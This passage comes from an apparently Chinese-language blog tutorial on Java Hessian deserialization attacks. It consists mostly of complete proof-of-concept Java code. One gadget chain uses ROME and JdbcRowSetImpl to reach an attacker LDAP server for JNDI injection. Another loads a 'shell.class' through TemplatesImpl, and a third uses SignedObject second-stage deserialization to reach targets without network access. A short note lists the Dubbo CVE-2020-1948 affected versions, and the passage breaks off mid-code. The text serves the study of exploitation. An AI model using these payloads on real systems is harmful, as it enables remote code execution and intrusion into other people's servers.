class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianInput;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianOutput;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hessian_JNDI</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="type">byte</span>[] serialize(T o) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">HessianOutput</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianOutput</span>(bao);</span><br><span class="line">        output.writeObject(o);</span><br><span class="line">        System.out.println(bao.toString());</span><br><span class="line">        <span class="keyword">return</span> bao.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bai</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">HessianInput</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianInput</span>(bai);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> input.readObject();</span><br><span class="line">        <span class="keyword">return</span> (T) o;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getValue</span><span class="params">(Object obj, String name)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JdbcRowSetImpl</span> <span class="variable">jdbcRowSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcRowSetImpl</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;ldap://192.168.142.129:9999/EXP&quot;</span>;</span><br><span class="line">        jdbcRowSet.setDataSourceName(url);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(JdbcRowSetImpl.class,jdbcRowSet);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class,toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//手动生成HashMap，防止提前调用hashcode()</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> makeMap(equalsBean,<span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] s = serialize(hashMap);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">        System.out.println((HashMap)deserialize(s));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap&lt;Object, Object&gt; <span class="title function_">makeMap</span> <span class="params">( Object v1, Object v2 )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        setValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        Class&lt;?&gt; nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( ClassNotFoundException e ) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v1, v1, <span class="literal">null</span>));</span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, v2, v2, <span class="literal">null</span>));</span><br><span class="line">        setValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230706165052839.png" alt="image-20230706165052839"></p><p><img src="../images/image-20230706165058207.png" alt="image-20230706165058207"></p><p>成功弹出计算器</p><h3 id="Apache-Dubbo-Hessian反序列化漏洞（CVE-2020-1948）"><a href="#Apache-Dubbo-Hessian反序列化漏洞（CVE-2020-1948）" class="headerlink" title="Apache Dubbo Hessian反序列化漏洞（CVE-2020-1948）"></a>Apache Dubbo Hessian反序列化漏洞（CVE-2020-1948）</h3><p>Apache Dubbo 是一款高性能的开源Java RPC框架。</p><h4 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h4><ul><li>2.7.0 &lt;= Dubbo Version &lt;= 2.7.6</li><li>2.6.0 &lt;= Dubbo Version &lt;= 2.6.7</li><li>Dubbo 所有 2.5.x 版本（官方团队目前已不支持）</li></ul><p><strong>这里的就不写了  了解一下就行了  因为搭建环境太麻烦了</strong></p><h3 id="TemplatesImpl-SignedObject二次反序列化-ROME不出网"><a href="#TemplatesImpl-SignedObject二次反序列化-ROME不出网" class="headerlink" title="TemplatesImpl+SignedObject二次反序列化(ROME不出网)"></a>TemplatesImpl+SignedObject二次反序列化(ROME不出网)</h3><p>上文我们构造的都是<code>JdbcRowSetImpl</code>这条ROME链，最终结果是造成JNDI注入。那如果目标不出网，我们又怎么利用呢？</p><p>或许你还记得ROME中的<code>TemplatesImpl</code>利用链，其能够加载任意类，进而任意代码执行。下面我们来尝试构造</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianInput;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianOutput;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hessian2_TemplatesImpl</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap&lt;Object, Object&gt; <span class="title function_">makeMap</span> <span class="params">( Object v1, Object v2 )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        setValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        Class&lt;?&gt; nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( ClassNotFoundException e ) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v1, v1, <span class="literal">null</span>));</span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, v2, v2, <span class="literal">null</span>));</span><br><span class="line">        setValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="type">byte</span>[] serialize(T o) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">HessianOutput</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianOutput</span>(bao);</span><br><span class="line">        output.writeObject(o);</span><br><span class="line">        System.out.println(bao.toString());</span><br><span class="line">        <span class="keyword">return</span> bao.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bai</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">HessianInput</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianInput</span>(bai);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> input.readObject();</span><br><span class="line">        <span class="keyword">return</span> (T) o;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\google download\\shell.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);</span><br><span class="line">        setValue(templatesimpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(TemplatesImpl.class,templatesimpl);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class,toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> makeMap(objectBean,<span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] payload = serialize(hashMap);</span><br><span class="line">        deserialize(payload);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里其实是由于<code>TemplatesImpl</code>类中被<code>transient</code>修饰的<code>_tfactory</code>属性无法被序列化，进而导致<code>TemplatesImpl</code>类无法初始化<img src="../images/image-20230706175648609.png" alt="image-20230706175648609"></p><p><strong>但是如果在jdk的原生反序列化的话就可以序列化成功</strong></p><p>我们知道，在使用Java原生的反序列化时，如果被反序列化的类重写了<code>readObject()</code>，那么Java就会通过反射来调用重写的<code>readObject()</code></p><p><img src="../images/image-20230706175844926.png" alt="image-20230706175844926"></p><p>可以看到这里手动new了一个TransformerFactoryImpl类赋值给<code>_tfactory</code>，这样就解决了<code>_tfactory</code>无法被序列化的情况</p><p>当一个变量被声明为 transient 时，在进行对象的序列化过程中，该变量的值不会被持久化保存到字节流中。这意味着在对象被反序列化后，<strong>该变量的值将会被设置为其默认值，而不是序列化时的值。</strong></p><p>如果一个类中包含了 <code>readObject</code> 方法，在对象进行反序列化时，会按照以下顺序执行相关操作：</p><ol><li>默认的反序列化操作会读取对象的非 transient 字段，并将它们的值恢复。</li><li>如果类中有 <code>readObject</code> 方法，那么该方法会被调用。在这个方法中，你可以自定义读取和恢复对象状态的过程。你可以使用 <code>defaultReadObject</code> 方法读取默认字段值，也可以通过实现自定义逻辑来恢复其他字段的值。</li><li>反序列化过程完成后，返回反序列化后的对象。</li></ol><p><strong>所以说就是变量被声明为 transient的时候可以进行序列化操作，只不过是会再反序列化(<code>readobject</code>)的时候值仍然是默认值</strong> </p><p><strong>那么我们应该怎么办呢  想法就是想让其进行序列化成功，如何然后再使用<code>hessian</code>进行反序列化</strong></p><p>这里的话我们就可以想到二次反序列化了  这里使用的是<code>SignedObject</code>这个类</p><p><img src="../images/image-20230706180355930.png" alt="image-20230706180355930"></p><p><strong>这里面用的就是原生的jdk序列</strong></p><p>在SignedObject类的构造函数能够序列化一个类并且将其存储到属性<code>content</code>中</p><p>在其<code>getObject()</code>中能够将其反序列化出来，并且该方法还是getter</p><p><img src="../images/image-20230706200004122.png" alt="image-20230706200004122"></p><p>rome 的<code>ToStringBean</code>的<code>toString()</code>方法  是可以调用任意<code>getter</code>方法的</p><p><strong>这就完美符合我们的利用条件，于是可以构造出如下Payload</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Input;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hessian2_SignedObject</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\ctf application\\idea_vip\\IntelliJ IDEA 2023.1.2\\project\\Hessian\\src\\main\\java\\org\\example\\calc.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);</span><br><span class="line">        setValue(templatesimpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class,templatesimpl);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">123</span>);</span><br><span class="line">        setValue(badAttributeValueExpException,<span class="string">&quot;val&quot;</span>,toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//此处写法较为固定，用于初始化SignedObject类</span></span><br><span class="line">        KeyPairGenerator keyPairGenerator;</span><br><span class="line">        keyPairGenerator = KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        keyPairGenerator.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> keyPairGenerator.genKeyPair();</span><br><span class="line">        <span class="type">PrivateKey</span> <span class="variable">privateKey</span> <span class="operator">=</span> keyPair.getPrivate();</span><br><span class="line">        <span class="type">Signature</span> <span class="variable">signingEngine</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(badAttributeValueExpException,privateKey,signingEngine);</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(SignedObject.class, signedObject);</span><br><span class="line"></span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class,toStringBean1);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> makeMap(equalsBean, equalsBean);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] payload = Hessian2_Serial(hashMap);</span><br><span class="line">        Hessian2_Deserial(payload);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] Hessian2_Serial(Object o) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">hessian2Output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(baos);</span><br><span class="line">        hessian2Output.writeObject(o);</span><br><span class="line">        hessian2Output.flushBuffer();</span><br><span class="line">        <span class="keyword">return</span> baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">Hessian2_Deserial</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">Hessian2Input</span> <span class="variable">hessian2Input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title 